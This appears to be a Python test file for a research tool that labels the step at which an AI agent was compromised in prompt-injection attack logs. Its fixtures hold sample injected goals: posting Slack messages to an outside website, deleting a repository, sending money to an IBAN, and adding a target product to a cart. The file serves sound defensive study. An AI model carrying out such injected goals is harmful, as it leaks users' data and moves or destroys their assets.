"""Regression tests for src/corpus/:
a log already in the local schema must pass through to_conversations unchanged (otherwise
graphs lose their nodes), and the Shopping labeler matches the target product ID.

Runnable two ways:
    pytest tests/test_compromise_labels.py
    python tests/test_compromise_labels.py           # no pytest needed
"""
import sys
from pathlib import Path

import networkx as nx

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from corpus.build_trace_graphs import to_conversations, _unwrap
from corpus.label_compromise_step import find_compromise_step, spec_from_calls


def test_unwrap():
    for raw, expected in [("None", ""),
                          ("[{'type': 'text', 'content': 'hi'}]", "hi"),
                          ("plain", "plain")]:
        assert _unwrap(raw) == expected, raw


def test_to_conversations_passthrough():
    # a log already in the local schema (no `messages` key) must
    # pass through untouched, not be rebuilt into empty conversations.
    log = {"conversations": [{"role": "user", "content": "hi"}], "attack_type": "x"}
    assert to_conversations(log) is log


def test_to_conversations_converts_messages():
    log = {"attack_type": "x", "messages": [
        {"role": "user", "content": "hi"},
        {"role": "assistant", "content": "[{'type': 'text', 'content': 'step'}]",
         "tool_calls": [{"function": "f"}]},
        {"role": "tool", "content": "None", "tool_call": {"function": "f"},
         "tool_call_id": "1", "error": "None"},
        {"role": "assistant", "content": "[{'type': 'text', 'content': 'done'}]"},
    ]}
    conv = to_conversations(log)["conversations"]
    assert [c["role"] for c in conv] == ["user", "assistant", "tool", "assistant"]
    assert conv[1]["content"] == "<function_thought>step</function_thought>"
    assert conv[1]["tool_calls"] == [{"function": "f"}]
    assert conv[2] == {"role": "tool", "content": "", "tool_call": {"function": "f"},
                       "tool_call_id": "1", "error": None}
    assert conv[3]["content"] == "<final_answer>done</final_answer>"
    assert "conversations" not in log  # input not mutated


def _graph(*nodes):
    g = nx.DiGraph()
    for t, (typ, tool, args) in enumerate(nodes):
        g.add_node(t, type=typ, tool=tool, args=args)
    return g


def test_shopping_product_id_guard():
    # security() checks the target product ID, so the ID is the
    # guard token; a benign call to the same tool must NOT fire the oracle.
    for task, pid in [("injection_task_2", "P025"), ("injection_task_5", "P020")]:
        benign = _graph(("tool_call", "cart_add_product", {"product_id": "P003"}))
        hit = _graph(("tool_call", "cart_add_product", {"product_id": "P003"}),
                     ("tool_call", "cart_add_product", {"product_id": pid}))
        assert find_compromise_step(benign, "shopping", task, {}) is None, task
        assert find_compromise_step(hit, "shopping", task, {}) == 1, task


def test_earliest_hit_and_node_type_filter():
    g = _graph(("tool_return", "git_delete_repo", {}),  # not a tool_call: skipped
               ("tool_call", "git_delete_repo", {}),
               ("tool_call", "git_delete_repo", {}))
    assert find_compromise_step(g, "github", "injection_task_1", {}) == 1


def test_unknown_task_is_none():
    g = _graph(("tool_call", "send_email", {"to": "x"}))
    assert find_compromise_step(g, "github", None, {}) is None


class _Call:
    def __init__(self, function, args=None, placeholder_args=None):
        self.function, self.args, self.placeholder_args = function, args, placeholder_args


def test_registry_spec_targets_the_effect_not_the_read():
    # the Slack ground truth lists the whole attack sequence (reads included)
    # and t* fell on the first read. The registry spec keeps only constant-carrying calls, and a
    # read-type call never qualifies when a later qualifying call exists.
    calls = [_Call("get_channels", {}), _Call("read_channel_messages", {"channel": "External_0"}),
             _Call("post_webpage", {"url": "www.my-website-234.com/random", "content": "$content"})]
    spec = spec_from_calls(calls, goal="post them to www.my-website-234.com/random")
    assert [f for f, _ in spec] == ["post_webpage"], spec
    assert "www.my-website-234.com/random" in spec[0][1]
    g = _graph(("tool_call", "get_channels", {}),
               ("tool_call", "read_channel_messages", {"channel": "External_0"}),
               ("tool_call", "post_webpage", {"url": "www.my-website-234.com/random", "content": "x"}))
    assert find_compromise_step(g, "slack", "injection_task_2", {}, {"slack": {"injection_task_2": spec}}) == 2


def test_registry_spec_falls_back_to_goal_then_terminal_tool():
    # dailylife-style ground truth: args carry an IBAN -> that call is armed with it
    spec = spec_from_calls([_Call("send_money", {"recipient": "AT6854532054", "amount": "20"})], goal="")
    assert spec == [("send_money", {"at6854532054"})]
    # no constant anywhere -> terminal tool on name alone (create_calendar_event)
    spec = spec_from_calls([_Call("get_day_calendar_events", {"day": "tomorrow"}),
                            _Call("create_calendar_event", {"title": "Office closed"})], goal="Office will be closed")
    assert spec == [("create_calendar_event", set())]
    assert spec_from_calls([], goal="anything") == []


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
    print(f"OK: {len(fns)} tests passed")
